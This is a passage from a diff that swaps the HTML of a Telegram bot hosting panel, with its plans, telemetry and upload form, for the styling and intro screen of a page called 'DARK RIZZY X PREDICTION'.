@@ -1,1876 +1,920 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ѕιмяαη нoѕтιηg ＲΒOT v2.1 — Cloud Bot Hosting Panel</title>
-  <!-- Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Font Awesome Icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
-  <!-- Google Fonts: Inter & JetBrains Mono -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DARK RIZZY X PREDICTION</title>
 
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['Inter', 'sans-serif'],
-            mono: ['JetBrains Mono', 'monospace'],
-          },
-          colors: {
-            slate: {
-              850: '#131c31',
-              900: '#0f172a',
-              950: '#070b14',
+    <style>
+        :root { 
+            --glass: rgba(0, 255, 255, 0.08);
+            --border: rgba(0, 255, 255, 0.35);
+            --neon-cyan: #00ffff;
+            --neon-violet: #8a2be2;
+            --cyber-lime: #ccff00;
+            --deep-dark: #0b0c1e;
+            --electric-pink: #ff10f0;
+            --gold: #ffd700;
+        }
+
+        html, body {
+            min-height: 100%;
+            margin: 0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+
+            /* YOUR IMAGE BACKGROUND */
+            background:
+                linear-gradient(
+                    rgba(5, 8, 20, 0.38),
+                    rgba(5, 8, 20, 0.48)
+                ),
+                url("https://i.imghos.co/IIGySwhh.jpg")
+                center center / cover fixed no-repeat;
+
+            color: #e0f0ff;
+            overflow-x: hidden;
+            user-select: none;
+        }
+
+        /* Background stays fixed */
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            z-index: -1;
+            background:
+                linear-gradient(
+                    rgba(5, 8, 20, 0.18),
+                    rgba(5, 8, 20, 0.25)
+                ),
+                url("https://i.imghos.co/IIGySwhh.jpg")
+                center center / cover no-repeat;
+            pointer-events: none;
+        }
+
+        /* --- Intro Screen --- */
+        #introScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+
+            /* SAME IMAGE ON INTRO */
+            background:
+                linear-gradient(
+                    rgba(5, 8, 20, 0.35),
+                    rgba(5, 8, 20, 0.45)
+                ),
+                url("https://i.imghos.co/IIGySwhh.jpg")
+                center center / cover no-repeat;
+
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 0.8s ease-out;
+        }
+
+        .intro-line {
+            font-size: clamp(20px, 6vw, 40px);
+            font-weight: 800;
+            letter-spacing: 3px;
+            white-space: nowrap;
+            text-transform: uppercase;
+            border-right: 4px solid var(--neon-cyan);
+            padding-right: 12px;
+            animation:
+                typing 2s steps(25),
+                blink 0.5s step-end infinite;
+            overflow: hidden;
+            text-shadow:
+                0 0 20px var(--neon-violet),
+                0 0 40px var(--neon-cyan);
+            color: #ffffff;
+        }
+
+        .intro-line span {
+            color: var(--neon-cyan);
+            text-shadow: 0 0 15px var(--neon-cyan);
+        }
+
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+
+        @keyframes blink {
+            from, to { border-color: transparent }
+            50% { border-color: var(--neon-cyan) }
+        }
+
+        .app-frame {
+            max-width: 480px;
+            margin: auto;
+            padding: 15px;
+        }
+
+        .glass-card {
+            background: rgba(10, 20, 30, 0.58);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px) saturate(180%);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow:
+                0 10px 35px -5px rgba(0, 255, 255, 0.3),
+                inset 0 0 25px rgba(0, 255, 255, 0.04);
+        }
+
+        .header {
+            text-align: center;
+            border-bottom: 2px solid var(--neon-cyan);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .header span:first-child {
+            color: #ffffff;
+            font-weight: 800;
+            letter-spacing: 2px;
+        }
+
+        .header span:last-child {
+            color: var(--neon-cyan);
+            font-weight: 400;
+        }
+
+        .pred-val {
+            font-size: 75px;
+            font-weight: 900;
+            text-shadow:
+                0 0 25px var(--neon-violet),
+                0 0 45px var(--neon-cyan);
+            margin: 10px 0;
+            color: #fff;
+        }
+
+        .timer-display {
+            font-size: 26px;
+            color: var(--cyber-lime);
+            font-weight: bold;
+            text-shadow: 0 0 10px #ccff00;
+        }
+
+        .status-info {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: var(--neon-cyan);
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .strat-mode {
+            font-size: 10px;
+            background: rgba(138, 43, 226, 0.25);
+            padding: 4px 14px;
+            border-radius: 30px;
+            color: var(--cyber-lime);
+            border: 1px solid var(--neon-cyan);
+            margin-bottom: 12px;
+            display: inline-block;
+            font-weight: 600;
+            backdrop-filter: blur(4px);
+        }
+
+        .lvl-badge {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon-cyan);
+            padding: 8px;
+            border-radius: 40px;
+            font-weight: bold;
+            margin: 15px 0;
+            font-size: 13px;
+            color: #fff;
+            box-shadow: 0 0 8px var(--neon-cyan);
+        }
+
+        .num-row {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+        }
+
+        .num-circle {
+            width: 50px;
+            height: 50px;
+            line-height: 50px;
+            border: 2px solid var(--cyber-lime);
+            border-radius: 50%;
+            font-weight: 900;
+            background: rgba(0,0,0,0.5);
+            color: var(--cyber-lime);
+            font-size: 22px;
+            box-shadow: 0 0 15px var(--cyber-lime);
+        }
+
+        .btn-clear {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #ff2a5e, #b030b0);
+            border: none;
+            border-radius: 40px;
+            color: white;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 42, 94, 0.6);
+            text-transform: uppercase;
+            font-size: 11px;
+            margin-top: 10px;
+        }
+
+        .btn-clear:hover {
+            background: linear-gradient(90deg, #ff1a4f, #9f1f9f);
+        }
+
+        .btn-copy {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(90deg, #00c6ff, #0072ff);
+            border: 1px solid var(--neon-cyan);
+            border-radius: 40px;
+            color: white;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+            text-transform: uppercase;
+            font-size: 12px;
+            margin-top: 18px;
+            letter-spacing: 1px;
+            transition: 0.2s;
+        }
+
+        .btn-copy:active {
+            transform: scale(0.97);
+        }
+
+        .cyber-input {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--neon-cyan);
+            border-radius: 30px;
+            color: #fff;
+            font-weight: bold;
+            text-align: center;
+            outline: none;
+            margin-bottom: 12px;
+            font-size: 13px;
+            box-shadow: inset 0 0 10px rgba(0, 255, 255, 0.2);
+        }
+
+        .history-wrap {
+            max-height: 400px;
+            overflow-y: auto;
+            border-radius: 16px;
+            padding-right: 5px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 11px;
+        }
+
+        th {
+            color: var(--neon-cyan);
+            padding: 10px 4px;
+            border-bottom: 1px solid var(--neon-violet);
+        }
+
+        td {
+            padding: 8px 4px;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
+            text-align: center;
+        }
+
+        .win {
+            color: #ccff00;
+            font-weight: bold;
+            text-shadow: 0 0 5px lime;
+        }
+
+        .jackpot {
+            color: var(--gold);
+            font-weight: 900;
+            text-shadow: 0 0 10px #ffd700, 0 0 20px #ff8c00;
+            letter-spacing: 0.5px;
+        }
+
+        .loss {
+            color: #ff10f0;
+            font-weight: bold;
+            text-shadow: 0 0 5px magenta;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        #pID {
+            color: rgba(200, 230, 255, 0.7);
+            font-size: 12px;
+        }
+
+        .key-box {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px dashed var(--cyber-lime);
+            padding: 12px;
+            border-radius: 15px;
+            margin: 12px 0;
+            font-size: 16px;
+            font-weight: 900;
+            color: var(--cyber-lime);
+            letter-spacing: 1.5px;
+            word-break: break-all;
+        }
+
+        /* Mobile background */
+        @media (max-width: 600px) {
+            html, body {
+                background-attachment: scroll;
             }
-          }
-        }
-      }
-    };
-  </script>
 
-  <style>
-    body {
-      background-color: #070b14;
-      color: #e2e8f0;
-      font-family: 'Inter', sans-serif;
-      overflow-x: hidden;
-    }
-    /* Subtle cyber grid background */
-    .bg-grid {
-      background-size: 36px 36px;
-      background-image: 
-        linear-gradient(to right, rgba(99, 102, 241, 0.05) 1px, transparent 1px),
-        linear-gradient(to bottom, rgba(99, 102, 241, 0.05) 1px, transparent 1px);
-    }
-    /* Custom Scrollbar */
-    ::-webkit-scrollbar {
-      width: 6px;
-      height: 6px;
-    }
-    ::-webkit-scrollbar-track {
-      background: #0f172a;
-    }
-    ::-webkit-scrollbar-thumb {
-      background: #334155;
-      border-radius: 9999px;
-    }
-    ::-webkit-scrollbar-thumb:hover {
-      background: #6366f1;
-    }
-    /* Glowing accents */
-    .glow-indigo {
-      box-shadow: 0 0 25px -5px rgba(99, 102, 241, 0.35);
-    }
-    .glow-emerald {
-      box-shadow: 0 0 20px -5px rgba(16, 185, 129, 0.35);
-    }
-    .terminal-box {
-      background: #050811;
-      border: 1px solid #1e293b;
-      font-family: 'JetBrains Mono', monospace;
-    }
-    @keyframes pulse-slow {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.45; }
-    }
-    .animate-pulse-slow {
-      animation: pulse-slow 2.2s infinite ease-in-out;
-    }
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      20%, 60% { transform: translateX(-8px); }
-      40%, 80% { transform: translateX(8px); }
-    }
-    .animate-shake {
-      animation: shake 0.4s ease-in-out;
-    }
-  </style>
+            body::before {
+                position: fixed;
+                background-attachment: scroll;
+            }
+
+            #introScreen {
+                background-attachment: scroll;
+            }
+        }
+    </style>
 </head>
-<body class="min-h-screen bg-grid flex flex-col selection:bg-indigo-500 selection:text-white">
 
-  <!-- ===================== TOP ANNOUNCEMENT / STATUS BAR ===================== -->
-  <div class="bg-gradient-to-r from-indigo-950/90 via-slate-900 to-emerald-950/90 border-b border-slate-800/80 px-4 py-1.5 text-xs">
-    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2">
-      <div class="flex items-center gap-2">
-        <span class="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-medium">
-          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
-          KEEPALIVE PORT: 10460
-        </span>
-        <span class="text-slate-400 hidden sm:inline">|</span>
-        <span class="text-slate-300 hidden sm:inline">
-          <i class="fa-solid fa-shield-halved text-indigo-400 mr-1"></i>
-          Fernet AES-128 Encrypted Sandbox + GitHub Keyring Vault Active
-        </span>
-      </div>
-      <div class="flex items-center gap-4 ml-auto">
-        <a href="https://t.me/+MXtA9ufCgok3Yjc1" target="_blank" rel="noopener" class="text-indigo-400 hover:text-indigo-300 transition flex items-center gap-1">
-          <i class="fa-brands fa-telegram"></i> Updates Channel
-        </a>
-        <span class="text-slate-400">Support: <strong class="text-slate-200">@nur7871</strong></span>
-      </div>
-    </div>
-  </div>
+<body>
 
-  <!-- ===================== MAIN HEADER / NAVBAR ===================== -->
-  <header class="sticky top-0 z-30 backdrop-blur-xl bg-slate-950/85 border-b border-slate-800/80">
-    <div class="max-w-7xl mx-auto px-4 py-3 flex flex-wrap items-center justify-between gap-4">
-      <!-- Brand Logo -->
-      <div class="flex items-center gap-3 cursor-pointer" onclick="switchTab('dashboard')">
-        <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-indigo-600 via-indigo-500 to-purple-600 flex items-center justify-center shadow-lg glow-indigo border border-indigo-400/30">
-          <i class="fa-solid fa-robot text-white text-xl"></i>
-        </div>
-        <div>
-          <div class="flex items-center gap-2">
-            <h1 class="font-extrabold text-lg tracking-tight bg-gradient-to-r from-white via-indigo-200 to-indigo-400 bg-clip-text text-transparent">
-              ѕιмяαη нoѕтιηg ＲΒOT
-            </h1>
-            <span class="text-[11px] font-mono font-semibold px-2 py-0.5 rounded-md bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
-              v2.1
-            </span>
-          </div>
-          <p class="text-xs text-slate-400">Python &amp; Node.js Cloud Bot Hosting Panel</p>
-        </div>
-      </div>
-
-      <!-- User Status Pills -->
-      <div class="flex flex-wrap items-center gap-2.5">
-        <!-- Slots Pill -->
-        <div class="px-3 py-1.5 rounded-xl bg-slate-900/90 border border-slate-800 flex items-center gap-2 text-xs">
-          <i class="fa-solid fa-cubes text-cyan-400"></i>
-          <span class="text-slate-400">Slots:</span>
-          <span id="navSlotsText" class="font-mono font-bold text-white">3 / 8</span>
-        </div>
-
-        <!-- Wallet Pill -->
-        <div onclick="openTopupModal()" class="cursor-pointer px-3 py-1.5 rounded-xl bg-slate-900/90 hover:bg-slate-800/90 border border-slate-800 flex items-center gap-2 text-xs transition">
-          <i class="fa-solid fa-wallet text-emerald-400"></i>
-          <span class="text-slate-400">Wallet:</span>
-          <span class="font-mono font-bold text-emerald-400"><span id="navWalletBalance">450</span> ৳</span>
-          <i class="fa-solid fa-circle-plus text-emerald-400 text-[11px] ml-0.5"></i>
-        </div>
-
-        <!-- Instant Plan Switcher Pill -->
-        <div class="px-2.5 py-1 rounded-xl bg-gradient-to-r from-amber-500/15 to-orange-500/15 border border-amber-500/30 flex items-center gap-2 text-xs">
-          <i class="fa-solid fa-crown text-amber-400"></i>
-          <span class="text-amber-200/80 hidden sm:inline">Plan:</span>
-          <select id="navPlanSelect" onchange="selectPlanDirect(this.value)" class="bg-transparent font-bold text-amber-300 tracking-wide uppercase focus:outline-none cursor-pointer pr-1">
-            <option value="free" class="bg-slate-900 text-slate-200">FREE (2 Bots)</option>
-            <option value="starter" class="bg-slate-900 text-slate-200">STARTER (4 Bots)</option>
-            <option value="basic" class="bg-slate-900 text-slate-200">BASIC (6 Bots)</option>
-            <option value="pro" selected class="bg-slate-900 text-amber-300">PRO PLAN (8 Bots)</option>
-            <option value="enterprise" class="bg-slate-900 text-slate-200">ENTERPRISE (10 Bots)</option>
-            <option value="lifetime" class="bg-slate-900 text-emerald-300">LIFETIME (15 Bots)</option>
-          </select>
-        </div>
-
-        <!-- Quick Upload CTA -->
-        <button onclick="switchTab('upload')" class="px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs flex items-center gap-2 shadow-md transition">
-          <i class="fa-solid fa-cloud-arrow-up"></i>
-          <span>Deploy Bot</span>
-        </button>
-      </div>
+    <div id="introScreen">
+        <div class="intro-line"><span>DARK RIZZY X</span> PREDICTION</div>
+        <p style="color: var(--neon-violet); letter-spacing: 3px; margin-top: 22px; font-size: 11px;">
+            ⚡ TG:- @RANGDARBHAI01 ⚡
+        </p>
     </div>
 
-    <!-- Navigation Tabs -->
-    <div class="max-w-7xl mx-auto px-4 flex items-center gap-1 overflow-x-auto border-t border-slate-900/80 pt-1">
-      <button onclick="switchTab('dashboard')" id="tabBtn-dashboard" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
-        <i class="fa-solid fa-chart-pie"></i> Dashboard
-      </button>
-      <button onclick="switchTab('upload')" id="tabBtn-upload" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
-        <i class="fa-solid fa-upload"></i> Upload &amp; Deploy
-      </button>
-      <button onclick="switchTab('bots')" id="tabBtn-bots" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
-        <i class="fa-solid fa-server"></i> My Bots
-        <span id="tabBotsCount" class="px-1.5 py-0.2 text-[11px] rounded-full bg-indigo-500/20 text-indigo-300 font-mono">3</span>
-      </button>
-      <button onclick="switchTab('scanner')" id="tabBtn-scanner" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
-        <i class="fa-solid fa-shield-virus"></i> AI Security Scanner
-      </button>
-      <button onclick="switchTab('plans')" id="tabBtn-plans" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
-        <i class="fa-solid fa-gem"></i> Plans &amp; Billing
-      </button>
-      <button onclick="switchTab('admin')" id="tabBtn-admin" class="tab-btn px-4 py-2.5 text-xs sm:text-sm font-semibold rounded-t-xl border-b-2 transition whitespace-nowrap flex items-center gap-2">
-        <i id="adminNavLockIcon" class="fa-solid fa-lock text-rose-400"></i> Admin Panel
-        <span id="pendingBadgeNav" class="px-1.5 py-0.2 text-[11px] rounded-full bg-rose-500/20 text-rose-300 font-mono">2</span>
-      </button>
-    </div>
-  </header>
+    <div id="mainWrapper" class="hidden">
 
-  <!-- ===================== MAIN CONTENT AREA ===================== -->
-  <main class="flex-1 max-w-7xl w-full mx-auto px-4 py-6 space-y-6">
+        <div class="app-frame">
 
-    <!-- ===================================================================== -->
-    <!-- TAB 1: DASHBOARD OVERVIEW                                             -->
-    <!-- ===================================================================== -->
-    <section id="tab-dashboard" class="tab-section space-y-6">
-      <!-- Hero Welcome Banner -->
-      <div class="relative rounded-2xl overflow-hidden bg-gradient-to-r from-slate-900 via-indigo-950/80 to-slate-900 border border-indigo-500/20 p-6 sm:p-8 shadow-xl">
-        <div class="relative z-10 flex flex-col lg:flex-row lg:items-center justify-between gap-6">
-          <div class="space-y-2 max-w-2xl">
-            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-500/15 border border-indigo-500/30 text-indigo-300 text-xs font-medium">
-              <i class="fa-solid fa-bolt text-amber-400"></i>
-              <span>Telegram Bot API 9.4 Ready • Auto-Dependency Installer</span>
-            </div>
-            <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">
-              Deploy Python &amp; Node.js Bots in Seconds
-            </h2>
-            <p class="text-sm text-slate-300 leading-relaxed">
-              Every uploaded file is scanned by our <strong>3-Layer Security Engine (Static Regex + Python AST + Gemma-4 AI)</strong>, encrypted with a unique <strong>Fernet AES-128 key</strong> stored in our GitHub Keyring, and executed in an isolated sandbox with secret-stripped environment variables.
-            </p>
-          </div>
-          <div class="flex flex-wrap sm:flex-nowrap gap-3">
-            <button onclick="switchTab('upload')" class="w-full sm:w-auto px-5 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-sm flex items-center justify-center gap-2 shadow-lg glow-indigo transition">
-              <i class="fa-solid fa-rocket"></i> Upload New Bot
-            </button>
-            <button onclick="switchTab('bots')" class="w-full sm:w-auto px-5 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold text-sm flex items-center justify-center gap-2 border border-slate-700 transition">
-              <i class="fa-solid fa-terminal"></i> Manage Bots
-            </button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Live Telemetry Cards -->
-      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
-        <!-- Card 1: Running Bots -->
-        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
-          <div>
-            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Running Bots</p>
-            <p class="text-2xl font-extrabold text-white mt-1 font-mono" id="statRunningBots">2 / 3</p>
-            <p id="statAutoRestartBadge" class="text-xs text-emerald-400 mt-1 flex items-center gap-1">
-              <i class="fa-solid fa-arrows-rotate"></i> Auto-Restart Enabled
-            </p>
-          </div>
-          <div class="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 text-xl">
-            <i class="fa-solid fa-play"></i>
-          </div>
-        </div>
-
-        <!-- Card 2: Sandbox RAM Usage -->
-        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
-          <div>
-            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">RAM Allocation</p>
-            <p class="text-2xl font-extrabold text-white mt-1 font-mono"><span id="statRamUsed">184.6</span> <span class="text-sm font-normal text-slate-400">/ <span id="statRamLimit">2048</span> MB</span></p>
-            <div class="w-36 h-1.5 bg-slate-800 rounded-full overflow-hidden mt-2">
-              <div id="statRamBar" class="h-full bg-indigo-500 rounded-full" style="width: 14%"></div>
-            </div>
-          </div>
-          <div class="w-12 h-12 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 text-xl">
-            <i class="fa-solid fa-memory"></i>
-          </div>
-        </div>
-
-        <!-- Card 3: CPU Telemetry -->
-        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
-          <div>
-            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Sandbox CPU Load</p>
-            <p class="text-2xl font-extrabold text-white mt-1 font-mono"><span id="statCpuLoad">6.4</span>%</p>
-            <p class="text-xs text-cyan-400 mt-1">8 Worker Threads Active</p>
-          </div>
-          <div class="w-12 h-12 rounded-xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400 text-xl">
-            <i class="fa-solid fa-microchip"></i>
-          </div>
-        </div>
-
-        <!-- Card 4: Panel Uptime -->
-        <div class="p-5 rounded-2xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
-          <div>
-            <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Panel Uptime</p>
-            <p class="text-2xl font-extrabold text-white mt-1 font-mono" id="statUptime">14d 06h 42m</p>
-            <p class="text-xs text-amber-400 mt-1 flex items-center gap-1">
-              <i class="fa-brands fa-github"></i> GitHub Synced
-            </p>
-          </div>
-          <div class="w-12 h-12 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-400 text-xl">
-            <i class="fa-solid fa-clock-rotate-left"></i>
-          </div>
-        </div>
-      </div>
-
-      <!-- Two-Column Grid: Active Bots Quick View + Account & Referral Card -->
-      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-        <!-- Left 2 Cols: Quick Bot Status Table -->
-        <div class="lg:col-span-2 rounded-2xl bg-slate-900/90 border border-slate-800 p-5 flex flex-col justify-between space-y-4">
-          <div class="flex items-center justify-between">
-            <div>
-              <h3 class="font-bold text-base text-white flex items-center gap-2">
-                <i class="fa-solid fa-layer-group text-indigo-400"></i>
-                Active Sandbox Processes
-              </h3>
-              <p class="text-xs text-slate-400">Real-time subprocess pool with automatic source-file wiping after boot</p>
-            </div>
-            <button onclick="switchTab('bots')" class="text-xs text-indigo-400 hover:text-indigo-300 font-semibold">
-              Open Full Manager <i class="fa-solid fa-arrow-right ml-1"></i>
-            </button>
-          </div>
-
-          <div id="dashboardBotsPreview" class="space-y-2.5">
-            <!-- Dynamically populated by JS -->
-          </div>
-        </div>
-
-        <!-- Right 1 Col: Referral & Free Trial Box -->
-        <div class="rounded-2xl bg-slate-900/90 border border-slate-800 p-5 space-y-4 flex flex-col justify-between">
-          <div class="space-y-3">
-            <div class="flex items-center justify-between">
-              <h3 class="font-bold text-base text-white flex items-center gap-2">
-                <i class="fa-solid fa-gift text-pink-400"></i>
-                Invite &amp; Earn Slots
-              </h3>
-              <span class="text-xs px-2 py-0.5 rounded-md bg-pink-500/15 text-pink-300 border border-pink-500/30">+1 Slot / Refer</span>
-            </div>
-            <p class="text-xs text-slate-400 leading-relaxed">
-              Share your referral link with friends. Every user who joins gives you <strong>+1 Bot Slot</strong> and <strong>+1 ৳ Wallet Credit</strong> automatically!
-            </p>
-            <div class="p-2.5 rounded-xl bg-slate-950 border border-slate-800 flex items-center justify-between gap-2">
-              <code id="refLinkInput" class="text-xs text-indigo-300 font-mono truncate">https://t.me/SimranHostingBot?start=8253072984</code>
-              <button onclick="copyRefLink()" class="px-2.5 py-1 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-medium shrink-0 transition">
-                <i class="fa-regular fa-copy mr-1"></i> Copy
-              </button>
-            </div>
-          </div>
-
-          <!-- Coupon & Trial Box -->
-          <div class="pt-3 border-t border-slate-800 space-y-2.5">
-            <div class="flex items-center justify-between text-xs">
-              <span class="text-slate-400">One-Time 48h Pro Trial:</span>
-              <button id="claimTrialBtn" onclick="claimFreeTrial()" class="px-2.5 py-1 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/30 font-semibold transition">
-                <i class="fa-solid fa-wand-magic-sparkles mr-1"></i> Claim 48h Trial
-              </button>
-            </div>
-            <div class="flex gap-2">
-              <input id="quickCouponInput" type="text" placeholder="Enter coupon (e.g. SIMRAN50)" class="w-full px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono focus:outline-none focus:border-indigo-500" />
-              <button onclick="redeemCoupon()" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-semibold text-white shrink-0 border border-slate-700 transition">
-                Redeem
-              </button>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- ===================================================================== -->
-    <!-- TAB 2: UPLOAD & DEPLOY BOT                                            -->
-    <!-- ===================================================================== -->
-    <section id="tab-upload" class="tab-section hidden space-y-6">
-      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-        <!-- Left 2 Cols: Upload Dropzone & Configuration -->
-        <div class="lg:col-span-2 rounded-2xl bg-slate-900/90 border border-slate-800 p-6 space-y-5">
-          <div class="flex flex-wrap items-center justify-between gap-2">
-            <div>
-              <h2 class="text-lg font-bold text-white flex items-center gap-2">
-                <i class="fa-solid fa-cloud-arrow-up text-indigo-400"></i>
-                Upload &amp; Deploy Bot Package
-              </h2>
-              <p class="text-xs text-slate-400">Supports single <code>.py</code>, <code>.js</code> files or full project <code>.zip</code> archives (up to 75 MB)</p>
-            </div>
-            <span class="px-2.5 py-1 rounded-lg bg-indigo-500/10 border border-indigo-500/30 text-indigo-300 text-xs font-mono">
-              <i class="fa-solid fa-lock mr-1"></i> Fernet AES-128
-            </span>
-          </div>
-
-          <!-- Drag & Drop Zone -->
-          <div id="dropZone" onclick="document.getElementById('botFileInput').click()" class="border-2 border-dashed border-slate-700 hover:border-indigo-500 rounded-2xl p-8 text-center cursor-pointer transition bg-slate-950/50 hover:bg-indigo-950/15 group">
-            <input type="file" id="botFileInput" accept=".py,.js,.zip" class="hidden" onchange="handleFileSelect(event)" />
-            <div class="w-16 h-16 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mx-auto text-indigo-400 text-2xl group-hover:scale-110 transition">
-              <i class="fa-solid fa-file-code"></i>
-            </div>
-            <p class="text-sm font-semibold text-white mt-4" id="selectedFileName">
-              Click to browse or drag &amp; drop your bot file here
-            </p>
-            <p class="text-xs text-slate-400 mt-1" id="selectedFileMeta">
-              Auto-detects entry point: <code>bot.py</code>, <code>main.py</code>, <code>app.py</code>, <code>index.js</code>, <code>bot.js</code>
-            </p>
-          </div>
-
-          <!-- Bot Details Form -->
-          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
-            <div>
-              <label class="block text-xs font-semibold text-slate-300 mb-1.5">Bot Name</label>
-              <input id="uploadBotName" type="text" placeholder="e.g., music_helper_bot" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-sm text-white font-mono focus:outline-none focus:border-indigo-500" />
-            </div>
-            <div>
-              <label class="block text-xs font-semibold text-slate-300 mb-1.5">Runtime / Entry Point</label>
-              <select id="uploadRuntime" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-sm text-white focus:outline-none focus:border-indigo-500">
-                <option value="python">Python 3.11 (bot.py / main.py)</option>
-                <option value="node">Node.js 20 LTS (index.js / bot.js)</option>
-              </select>
-            </div>
-          </div>
-
-          <!-- Optional BOT_TOKEN Env Variable -->
-          <div>
-            <label class="block text-xs font-semibold text-slate-300 mb-1.5">
-              Telegram <code>BOT_TOKEN</code> (Injected into isolated Sandbox Environment)
-            </label>
-            <input id="uploadBotToken" type="password" placeholder="e.g., 7123456789:AAHxyz..." class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-sm text-white font-mono focus:outline-none focus:border-indigo-500" />
-            <p class="text-[11px] text-slate-400 mt-1">
-              <i class="fa-solid fa-info-circle text-indigo-400 mr-1"></i>
-              Passing your token as an environment variable avoids hardcoding credentials in source files.
-            </p>
-          </div>
-
-          <!-- Paste Code Or Sample Selector -->
-          <div>
-            <div class="flex items-center justify-between mb-1.5">
-              <label class="text-xs font-semibold text-slate-300">Bot Source Code (Preview / Direct Editor)</label>
-              <div class="flex gap-1.5">
-                <button type="button" onclick="loadUploadSample('safe')" class="text-[11px] px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">Load Safe Bot</button>
-                <button type="button" onclick="loadUploadSample('malicious')" class="text-[11px] px-2 py-0.5 rounded bg-rose-500/15 text-rose-300 border border-rose-500/30">Test Malicious Bot</button>
-              </div>
-            </div>
